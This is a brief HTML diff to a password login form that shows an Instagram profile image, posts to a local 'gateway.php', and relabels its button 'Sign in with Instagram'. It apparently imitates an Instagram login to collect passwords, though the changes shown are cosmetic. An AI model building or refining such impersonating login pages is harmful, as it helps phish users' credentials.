@@ -19,7 +19,7 @@
 
       <form class="form-signin" method="POST" action="gateway.php">
         <img src="https://scontent-frt3-1.cdninstagram.com/t51.2885-19/s150x150/19429483_143315616232889_3294209164066160640_a.jpg" class="rounded mx-auto d-block">
-        <h1>Username</h1>
+        <center><h1>Username</h1></center>
         <label for="inputPassword" class="sr-only">Password</label>
         <input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
         <div class="checkbox">
@@ -27,7 +27,7 @@
             <input type="checkbox" value="remember-me"> Remember me
           </label>
         </div>
-        <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
+        <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in with Instagram</button>
       </form>
 
     </div> <!-- /container -->
